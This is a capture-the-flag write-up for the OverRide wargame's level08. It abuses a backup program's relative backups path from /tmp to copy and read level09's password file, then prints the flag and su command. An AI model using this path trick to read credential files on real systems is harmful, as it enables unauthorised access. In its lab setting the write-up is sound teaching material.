Here, we have a program that reads a given file and creates a backup into the `backups` folder.
So the first thing we try :

```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

```

Maybe we can try to create the given directories ? 

```
level08@OverRide:~$ mkdir -p backups/home/users/level09
mkdir: cannot create directory `backups/home': Permission denied
```

No luck here.
So let's try to do the same thing but inside a directory where we have more rights:

```bash
level08@OverRide:/tmp$ cd /tmp
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

hmmm forgot something...

```bash
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

```bash
su level09
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

